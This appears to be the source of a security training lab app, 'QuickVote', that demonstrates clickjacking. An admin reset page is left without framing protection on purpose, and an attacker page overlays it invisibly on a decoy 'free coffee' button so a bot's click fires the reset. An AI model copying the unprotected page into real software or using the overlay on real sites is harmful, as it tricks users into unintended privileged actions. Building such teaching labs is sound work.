/**
 * QuickVote — A Very Generous Giveaway (clickjacking / UI redressing)
 *
 * /admin/reset sets no X-Frame-Options / frame-ancestors, so it can be
 * framed. /attacker/demo stacks that framed page, made invisible, exactly
 * over a decoy "Claim your gift" button. The admin-bot performs a REAL
 * pointer click at the decoy's on-screen position (see admin-bot.ts's
 * `[data-ck-target]` handling) — because the invisible iframe sits on top at
 * that exact point, the click physically lands on the real reset button
 * inside it. Recorded only when that real button's own handler fires.
 */
import { createLabApp, startLabApp, loadLabContext, reportSolve, renderShell, registerAdminSession } from "@nulllab/lab-sdk";

const ctx = loadLabContext();
const APP = "QuickVote";
const ADMIN_COOKIE = "qv_admin";
let votesReset = false;

function shell(title: string, body: string): string {
  return renderShell(title, body, { appName: APP, accent: "#ff6b6b", navLinks: [{ href: "/", label: "Vote" }] });
}

async function main() {
  const app = await createLabApp(ctx, { appName: APP });
  registerAdminSession(app, ctx, ADMIN_COOKIE);

  app.get("/", async (_req, reply) => {
    reply.type("text/html");
    return shell("Vote", `<div class="panel"><h1>QuickVote</h1><p class="muted">Public voting demo. Nothing sensitive here.</p></div>`);
  });

  // The sensitive page: real admin control, no framing protection at all.
  app.get("/admin/reset", async (req, reply) => {
    const isAdmin = req.headers.cookie?.includes(`${ADMIN_COOKIE}=`) ?? false;
    reply.type("text/html");
    // VULNERABLE: no X-Frame-Options / Content-Security-Policy frame-ancestors is set — this page can be framed by anyone.
    if (!isAdmin) {
      reply.code(403);
      return shell("Forbidden", `<div class="panel"><p>Administrators only.</p></div>`);
    }
    return `<!doctype html><html><head><meta charset="utf-8" /><style>html,body{margin:0;padding:0;height:100%;}button{display:block;width:100%;height:100%;font-size:16px;font-family:sans-serif;background:#b33;color:#fff;border:0;cursor:pointer;}</style></head>
      <body><button id="reset-btn" onclick="fetch('/admin/reset/confirm',{method:'POST'}).then(()=>{document.title='reset-done'})">Reset all votes</button></body></html>`;
  });

  app.post("/admin/reset/confirm", async (req, reply) => {
    const isAdmin = req.headers.cookie?.includes(`${ADMIN_COOKIE}=`) ?? false;
    if (!isAdmin) return reply.code(403).send({ error: "forbidden" });
    votesReset = true;
    await reportSolve(ctx, "the admin reset-votes button was activated by a real pointer click at the on-screen position of an unrelated decoy element");
    return { ok: true };
  });

  app.get("/votes-reset-status", async () => ({ votesReset }));

  // The attacker's page: frames /admin/reset invisibly, over a decoy button.
  app.get("/attacker/demo", async (_req, reply) => {
    reply.type("text/html");
    return `<!doctype html><html><head><meta charset="utf-8" /><title>You've won a prize!</title>
      <style>
        html,body{margin:0;padding:0;font-family:sans-serif;background:#111;color:#eee;}
        .wrap{position:relative;width:260px;height:60px;margin:120px auto;}
        .decoy{position:absolute;inset:0;background:gold;color:#222;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;z-index:1;}
        iframe{position:absolute;inset:0;width:260px;height:60px;border:0;opacity:0.001;z-index:2;}
      </style></head>
      <body>
        <p style="text-align:center;">Congratulations! Click below to claim your free coffee.</p>
        <div class="wrap">
          <button class="decoy" data-ck-target>☕ Claim your free coffee!</button>
          <iframe src="/admin/reset" tabindex="-1"></iframe>
        </div>
      </body></html>`;
  });

  // A non-framed variant of the same decoy, for the "clicking the decoy alone does nothing" negative test.
  app.get("/attacker/demo-safe", async (_req, reply) => {
    reply.type("text/html");
    return `<!doctype html><html><head><meta charset="utf-8" /></head><body style="font-family:sans-serif;">
      <div style="width:260px;height:60px;margin:120px auto;">
        <button data-ck-target style="width:100%;height:100%;background:gold;border:none;border-radius:6px;font-size:16px;">☕ Claim your free coffee!</button>
      </div></body></html>`;
  });

  await startLabApp(app, ctx, APP);
}

main().catch((err) => {
  console.error("[quickvote] fatal error:", err);
  process.exit(1);
});
